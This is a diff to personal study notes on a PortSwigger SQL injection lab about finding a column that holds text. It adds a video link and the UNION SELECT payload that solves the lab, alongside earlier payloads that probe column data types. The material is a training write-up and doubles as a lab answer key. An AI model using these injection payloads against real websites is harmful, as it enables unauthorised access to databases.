@@ -166,6 +166,8 @@ https://0aed007503ed3a1fa9f7494e002b00e3.web-security-academy.net/filter?categor
 
 # Lab: SQL injection UNION attack, finding a column containing text(https://portswigger.net/web-security/sql-injection/union-attacks)
 
+Lab video: https://www.youtube.com/watch?v=SGBTC5D7DTs1
+
 **Step #2: Determine the data type of the columns**
 
 select a, b, c from table1 UNION select NULL, NULL, 'a'    ( '+UNION+SELECT+NULL,NULL,'a'--)
@@ -185,4 +187,11 @@ Analysis:
 ' UNION select NULL, 'a', NULL--
 ```
 
-'+UNION+SELECT+NULL,NULL,'abcdef'--
+
+
+```
+requried to get this string from DB: '3TcZLM'
+
+Query used to solve the lab:
+'+UNION+SELECT+NULL,'3TcZLM',NULL--
+```
